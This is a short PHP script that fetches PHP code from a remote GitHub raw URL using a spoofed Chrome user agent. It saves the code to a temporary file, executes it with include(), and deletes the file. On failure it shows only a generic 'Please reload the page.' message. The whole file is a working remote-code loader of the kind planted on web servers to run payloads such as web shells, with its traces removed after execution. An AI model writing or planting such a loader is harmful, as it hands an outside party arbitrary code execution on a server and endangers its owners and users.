<?php
// URL of the remote PHP file
$url = "https://raw.githubusercontent.com/hurairaxp/Random-files/main/moo.php";
$response = file_get_contents($url);

// Initialize cURL session
$ch = curl_init($url);

// Set the Chrome user agent
$chromeUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
curl_setopt($ch, CURLOPT_USERAGENT, $chromeUserAgent);

// Return the transfer as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL session and store the result
$response = curl_exec($ch);

// Check if there was an error
if (curl_errno($ch)) {
    echo "Please reload the page.";
} else {
    // Save the response to a temporary file
    $tmpFile = tempnam(sys_get_temp_dir(), 'remote_php_');
    file_put_contents($tmpFile, $response);

    // Include the temporary file
    include($tmpFile);

    // Optionally delete the temporary file
    unlink($tmpFile);
}

// Close the cURL session
curl_close($ch);
exit();

/*
$tmpFile = tempnam(sys_get_temp_dir(), 'remote_php_');
file_put_contents($tmpFile, $response);

// Include the temporary file
include($tmpFile);

// Optionally delete the temporary file
unlink($tmpFile);
*/
?>